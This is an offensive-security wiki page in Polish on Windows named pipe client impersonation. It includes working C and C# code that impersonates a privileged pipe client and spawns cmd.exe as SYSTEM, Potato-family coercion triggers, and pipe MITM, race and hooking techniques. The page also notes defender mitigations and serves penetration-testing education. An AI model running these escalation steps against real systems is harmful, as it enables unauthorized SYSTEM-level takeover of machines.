# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation to lokalny primitive privilege escalation, który pozwala wątkowi named-pipe server przyjąć security context klienta, który się z nim łączy. W praktyce attacker, który może uruchamiać code z SeImpersonatePrivilege, może zmusić uprzywilejowanego klienta (np. usługę SYSTEM) do połączenia z pipe kontrolowanym przez attacker, wywołać ImpersonateNamedPipeClient, zduplikować wynikowy token do primary token i uruchomić process jako klient (często NT AUTHORITY\SYSTEM).

Ta strona skupia się na podstawowej technice. Dla end-to-end exploit chains, które zmuszają SYSTEM do połączenia z twoim pipe, zobacz strony z rodziny Potato wymienione poniżej.

## TL;DR
- Utwórz named pipe: \\.\pipe\<random> i czekaj na połączenie.
- Spraw, aby uprzywilejowany komponent połączył się z nim (spooler/DCOM/EFSRPC/etc.).
- Odczytaj co najmniej jedną wiadomość z pipe, a następnie wywołaj ImpersonateNamedPipeClient.
- Otwórz impersonation token z bieżącego thread, DuplicateTokenEx(TokenPrimary) i CreateProcessWithTokenW/CreateProcessAsUser, aby uzyskać process SYSTEM.

## Requirements and key APIs
- Privileges zwykle wymagane przez calling process/thread:
- SeImpersonatePrivilege, aby skutecznie impersonate connectującego klienta i używać CreateProcessWithTokenW.
- Alternatywnie, po impersonating SYSTEM, możesz użyć CreateProcessAsUser, co może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (są one spełnione, gdy impersonujesz SYSTEM).
- Główne używane APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (musisz odczytać co najmniej jedną wiadomość przed impersonation)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW lub CreateProcessAsUser
- Impersonation level: aby wykonywać przydatne działania lokalnie, klient musi pozwalać na SecurityImpersonation (domyślne dla wielu lokalnych klientów RPC/named-pipe). Klienci mogą obniżyć to za pomocą SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION podczas otwierania pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Uwagi:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytałeś z pipe i że klient nie ograniczył impersonation do poziomu Identification.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć primary token odpowiedni do tworzenia procesu.

## .NET quick example
W .NET, NamedPipeServerStream może impersonować przez RunAsClient. Po impersonacji zduplikuj thread token i utwórz process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Te techniki wymuszają, aby uprzywilejowane usługi połączyły się z Twoim named pipe, dzięki czemu możesz je impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Gdy uprzywilejowana usługa i proces o niskich uprawnieniach komunikują się przez `\\.\pipe\...`, traktuj pipe jak każdy inny niezaufany boundary IPC. Poza klasyczną server-side impersonation, słabe ACL-e pipe, niebezpieczne flagi tworzenia i decyzje o zaufaniu po stronie clienta mogą stać się lokalnymi primitive do local privilege escalation.

### Enumerate candidate pipes first
- Szybko wylistuj pipe z PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` jest przydatny do wykrywania liczby instance i pipe single-instance.
- Priorytetyzuj nazwy używane przez usługi działające jako `SYSTEM`, zwłaszcza helpers, updaters, launchers i UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Każdy proces, który może komunikować się z uprzywilejowanym serverem, może już fuzzować jego protocol i szukać uprzywilejowanych verbów.
- Bardziej interesujący przypadek występuje, gdy DACL przyznaje `FILE_GENERIC_WRITE`/`GENERIC_WRITE` na obiekt pipe. W named pipes obejmuje to domyślnie `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` współdzieli ten sam bit), więc attacker może utworzyć kolejną instance servera o tej samej nazwie.
- Ponieważ instance są dopasowywane w kolejności FIFO, attacker-created i legitimate instance mogą się przeplatać: utwórz rogue instance przez `CreateNamedPipe`, potem otwórz tę samą nazwę pipe przez `CreateFile` i poczekaj, aż prawdziwy client trafi na rogue server instance.
- Result: obserwuj, modyfikuj, relay lub desynchronizuj uprzywilejowane IPC bez potrzeby przejęcia oryginalnego procesu servera.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` definiuje DACL tylko wtedy, gdy tworzona jest pierwsza instance danej nazwy pipe.
- Jeśli uprzywilejowana usługa startuje późno i nie używa `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker może wcześniej utworzyć nazwę pipe z permissive DACL, a następnie pozwolić usłudze tworzyć kolejne instance w security context wybranym przez attacker.
- To zamienia start usługi w race condition: wygraj first instance, a potem łącz się lub MITM kolejne clienty, korzystając z osłabionego ACL.
- Mitigation dla defenders i ważny punkt analizy dla attackerów: sprawdź, czy `CreateNamedPipe(..., dwOpenMode, ...)` zawiera `FILE_FLAG_FIRST_PIPE_INSTANCE`. Jeśli nie, przetestuj pre-creation przed startem usługi.

### PID/signature checks are hardening, not a boundary
- Niektóre produkty próbują ograniczać dostęp, sprawdzając `GetNamedPipeClientProcessId`, ścieżkę obrazu procesu lub podpis Authenticode connectującego clienta.
- Pomaga to tylko do momentu, gdy wstrzykniesz kod do legalnego clienta: po wejściu do zaufanego procesu dziedziczysz dokładnie ten PID/image/signature context, którego oczekuje server.
- W przypadku split desktop apps instrumentowanie low-privileged procesu UI/helper jest często łatwiejsze niż bezpośredni atak na usługę `SYSTEM`.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` przed tym, jak syscall zużyje buffer, i inspect/patch `NtReadFile` po jego zwrocie.
- Overlapped I/O: zapisz `OVERLAPPED`/`IoStatusBlock` widziany w `NtReadFile`, a następnie inspect buffer po `GetOverlappedResult` lub po zakończeniu odpowiedniego wait.
- Completion ports: `GetQueuedCompletionStatus` trafia do `NtRemoveIoCompletion`; zwrócony `ApcContext` prowadzi z powrotem do `OVERLAPPED` użytego przez oryginalny read, co jest właściwym pivotem, aby znaleźć teraz wypełniony buffer.
- Completion routines (`ReadFileEx`): completion callback jest dostarczany jako APC. Jeśli chcesz manipulować zwróconymi danymi lub injectować syntetyczne reply, hook real completion routine i, do custom injection, użyj jednoparametrowego `QueueUserAPC` dispatcher, który odtwarza 3 oczekiwane argumenty routine.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxyzuje named-pipe traffic przez wstrzykniętą helper DLL i udostępnia workflow podobny do Burp do edycji/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) stosuje podejście oparte na Frida i skupia się na hookowaniu `NtReadFile`/`NtWriteFile` oraz async/completion pivotach opisanych powyżej, a następnie przekazuje traffic do workflow edycji opartego na WebSocket.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes są niskolatencyjne; długie pauzy podczas edycji buforów mogą deadlockować kruche usługi.
- Klienci sterowani przez overlapped/completion-port/APC wymagają innych hooków niż proste detours `ReadFile`/`WriteFile`.
- Injection do zaufanego klienta jest noisy i zwykle najlepiej zostawić ją do exploit development, reverse engineering protokołu albo lokalnego fuzzing w labie.

## Troubleshooting and gotchas
- Musisz odczytać co najmniej jedną wiadomość z pipe przed wywołaniem ImpersonateNamedPipeClient; w przeciwnym razie dostaniesz ERROR_CANNOT_IMPERSONATE (1368).
- Jeśli klient łączy się z SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, serwer nie może w pełni impersonate; sprawdź poziom impersonation tokena przez GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW wymaga SeImpersonatePrivilege po stronie wywołującego. Jeśli to się nie powiedzie z ERROR_PRIVILEGE_NOT_HELD (1314), użyj CreateProcessAsUser dopiero po tym, jak już impersonate SYSTEM.
- Upewnij się, że security descriptor twojego pipe pozwala docelowemu service na połączenie, jeśli go zaostrzysz; domyślnie pipe’y pod \\.\pipe są dostępne zgodnie z DACL serwera.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
